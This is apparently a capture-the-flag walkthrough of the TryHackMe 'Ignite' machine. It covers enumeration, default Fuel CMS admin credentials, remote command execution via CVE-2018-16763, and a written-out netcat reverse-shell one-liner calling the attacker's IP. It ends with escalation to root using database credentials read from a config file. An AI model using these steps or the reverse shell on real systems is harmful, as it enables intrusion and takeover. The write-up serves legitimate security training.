---
title: "Ignite"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="ignite.png" alt="ignite" width=200/>

## Enumeration

### nmap
```
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
| http-methods: 
|_  Supported Methods: HEAD OPTIONS

```
### ffuf
```
0                       [Status: 200, Size: 16595, Words: 770, Lines: 232]
.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 291, Words: 22, Lines: 12]
home                    [Status: 200, Size: 16595, Words: 770, Lines: 232]
index.php               [Status: 200, Size: 16595, Words: 770, Lines: 232]
index                   [Status: 200, Size: 16595, Words: 770, Lines: 232]
robots.txt              [Status: 200, Size: 30, Words: 3, Lines: 2]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]
```

Well only port 80 is open...we know its the website enumeration or nothing

`Fuel CMS version 1.4`

That was in plain sight..wait they litteraly show the CMS instalation documentation

```
To access the FUEL admin, go to:
http://10.10.74.189/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)
```
yeah actually the default credentials work

In dashboard I tried to create a page with php shellcode but I couldnt access it

````
There is an updated view file located at 
/var/www/html/fuel/application/views/home.php.
Would you like to upload it into the body of your page (if available)?
````

I tried to upload too but many php extension variants are not allowed

Let's just search an exploit then

We found `CVE-2018-16763`

there were many exploitdb scripts for that but the 3rd exploit was the best 

It was for python3 so I chose that one as `50477.py`

The script just takes the baseurl as argument

```
└──╼ $python 50477.py -u http://10.10.140.103
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
```
After playing with basic commands I can spawn a netcat shell with this payload

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.226.203 2311 >/tmp/f
```

Then I get access on my listenner

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
I get simple python tty before grabbing first flag

```
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt

```

## Priilege Escalation

this part was not too hard because I knew after reading the website documentation

And as there is no real user on machine anyway its all about the CMS instalation

I knew I would check for php config files

```
Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file.
After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database 
to match the new database you created.
```

We go where the file is and read it

```
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
cat database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
 * | -------------------------------------------------------------------
 * | DATABASE CONNECTIVITY SETTINGS
 * | -------------------------------------------------------------------
 * | This file will contain the settings needed to access your database.
 * |
 * | For complete instructions please consult the 'Database Connection'
 * | page of the User Guide.
 * |
 * | -------------------------------------------------------------------
 * | EXPLANATION OF VARIABLES
 * | -------------------------------------------------------------------
 * |
 * |       ['dsn']      The full DSN string describe a connection to the database.
 * |       ['hostname'] The hostname of your database server.
 * |       ['username'] The username used to connect to the database
 * |       ['password'] The password used to connect to the database
 * |       ['database'] The name of the database you want to connect to
 * |       ['dbdriver'] The database driver. e.g.: mysqli.
 * |                       Currently supported:
 * |                                cubrid, ibase, mssql, mysql, mysqli, oci8,
 * |                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
 * |       ['dbprefix'] You can add an optional prefix, which will be added
 * |                                to the table name when using the  Query Builder class
 * |       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
 * |       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
 * |       ['cache_on'] TRUE/FALSE - Enables/disables query caching
 * |       ['cachedir'] The path to the folder where cache files should be stored
 * |       ['char_set'] The character set used in communicating with the database
 * |       ['dbcollat'] The character collation used in communicating with the database
 * |                                NOTE: For MySQL and MySQLi databases, this setting is only used
 * |                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
 * |                                (and in table creation queries made with DB Forge).
 * |                                There is an incompatibility in PHP with mysql_real_escape_string() which
 * |                                can make your site vulnerable to SQL injection if you are using a
 * |                                multi-byte character set and are running versions lower than these.
 * |                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
 * |       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
 * |       ['encrypt']  Whether or not to use an encrypted connection.
 * |
 * |                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
 * |                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
 * |
 * |                               'ssl_key'    - Path to the private key file
 * |                               'ssl_cert'   - Path to the public key certificate file
 * |                               'ssl_ca'     - Path to the certificate authority file
 * |                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
 * |                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
 * |                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
 * |
 * |       ['compress'] Whether or not to use client compression (MySQL only)
 * |       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
 * |                                                       - good for ensuring strict SQL while developing
 * |       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
 * |       ['failover'] array - A array with 0 or more data for connections if the main should fail.
 * |       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
 * |                               NOTE: Disabling this will also effectively disable both
 * |                               $this->db->last_query() and profiling of DB queries.
 * |                               When you run a query, with this setting set to TRUE (default),
 * |                               CodeIgniter will store the SQL statement for debugging purposes.
 * |                               However, this may cause high memory usage, especially if you run
 * |                               a lot of SQL queries ... disable this to avoid that problem.
 * |
 * | The $active_group variable lets you choose which connection group to
 * | make active.  By default there is only one group (the 'default' group).
 * |
 * | The $query_builder variables lets you determine whether or not to load
 * | the query builder class.
 */
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
	'dsn'   => '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
					   'cache_on' => FALSE,
					   'cachedir' => '',
					   'char_set' => 'utf8',
					   'dbcollat' => 'utf8_general_ci',
					   'swap_pre' => '',
					   'encrypt' => FALSE,
					   'compress' => FALSE,
					   'stricton' => FALSE,
					   'failover' => array(),
					   'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
	@include(TESTER_PATH.'config/tester_database'.EXT);
}
```

In the last parts of the file we can see the database is setup with root credentials

I guess the credentials work for the system so I use them to go root

```
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# 

root@ubuntu:~# cat root.txt
cat root.txt
```

And the fire is lit!

I wonder how popular CodeIgniter still is

